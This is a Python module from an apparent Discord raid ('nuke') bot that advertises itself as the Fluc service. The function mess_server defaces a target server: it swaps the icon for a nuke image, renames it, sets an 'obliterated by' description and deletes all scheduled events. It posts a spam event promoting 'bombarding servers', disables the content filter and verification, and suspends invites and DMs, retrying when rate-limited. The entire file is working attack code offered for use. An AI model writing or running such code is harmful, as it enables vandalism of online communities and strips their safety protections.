__all__ = (
    'mess_server',
)

import utils
import asyncio
import discord
from utils.models import Settings
from utils.state import State
from discord.utils import MISSING

async def mess_server(server: discord.Guild, settings: Settings, ignore_event: bool = False):
    server_banner = MISSING
    server_splash = MISSING
    with open('assets/icons/nuke.gif', 'rb') as file:
        server_icon = file.read()
    if server.premium_tier > 1:
        with open('assets/v2/fluc_fat.png', 'rb') as file:
            server_splash = file.read()
    if server.premium_tier > 1:
        server_banner = server_splash
    if not ignore_event:
        for event in server.scheduled_events:
            asyncio.create_task(event.delete())
        if server.me.guild_permissions.create_events:
            asyncio.create_task(server.create_scheduled_event(
                name=State.get_phrase(),
                # We might experience big latency while naking
                start_time=utils.now(seconds=3),
                end_time=utils.now().replace(year=2029),
                entity_type=discord.EntityType.external,
                privacy_level=discord.PrivacyLevel.guild_only,
                location='https://discord.gg/fluc | https://fluc.lol',
                image=server_banner,
                description='Join Fluc and start bombarding servers today! https://discord.gg/fluc'
            ))
    try:
        await server.edit(
            name=settings.server_name,
            description='This place has been obliterated by https://discord.gg/fluc. Join now if you want a bot like this.',
            icon=server_icon,
            community=False,
            splash=server_splash,
            banner=server_banner,
            default_notifications=discord.NotificationLevel.all_messages,
            system_channel_flags=discord.SystemChannelFlags._from_value(0),
            discoverable=False,
            widget_enabled=False,
            dms_disabled_until=utils.now(days=1),
            invites_disabled_until=utils.now(days=1),
            premium_progress_bar_enabled=True,
            verification_level=discord.VerificationLevel.none,
            explicit_content_filter=discord.ContentFilter.disabled
        )
    except discord.Forbidden:
        # Server limited
        return
    except discord.HTTPException as exc:
        if exc.status == 429:
            await asyncio.sleep(1)
            return await mess_server(server, settings, True)